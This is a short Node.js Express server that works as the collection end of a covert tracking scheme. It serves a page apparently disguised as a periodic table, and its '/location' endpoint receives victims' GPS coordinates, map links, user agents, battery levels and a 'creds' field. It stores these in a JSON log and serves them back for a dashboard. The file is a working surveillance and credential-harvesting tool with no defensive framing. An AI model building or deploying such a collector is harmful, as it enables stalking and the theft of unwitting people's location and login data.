const express = require('express');
const fs = require('fs');
const path = require('path');
app = express();

app.use(express.static('.')); // Serve periodic-table.html
app.use(express.json());

const LOG_FILE = 'gps_hits.json';
const HTML_FILE = 'gps_dashboard.html';

// Initialize log file
if (!fs.existsSync(LOG_FILE)) {
    fs.writeFileSync(LOG_FILE, JSON.stringify([]));
}

// Webhook endpoint - receives GPS data
app.post('/location', (req, res) => {
    const data = req.body;
    console.log('🗺️ HIT:', data.lat, data.lon, data.ua);
    
    // Append to JSON log (persistent)
    const hits = JSON.parse(fs.readFileSync(LOG_FILE));
    hits.push({
        timestamp: new Date().toISOString(),
        lat: data.lat,
        lon: data.lon,
        mapsUrl: data.mapsUrl,
        accuracy: data.accuracy,
        ua: data.ua,
        battery: data.battery,
        creds: data.creds || null
    });
    fs.writeFileSync(LOG_FILE, JSON.stringify(hits, null, 2));
    
    res.sendStatus(200);
});

app.get('/api/hits', (req, res) => {
    const hits = JSON.parse(fs.readFileSync(LOG_FILE));
    res.json(hits);
});

app.listen(3000, () => console.log('🚀 Server running on port 3000'));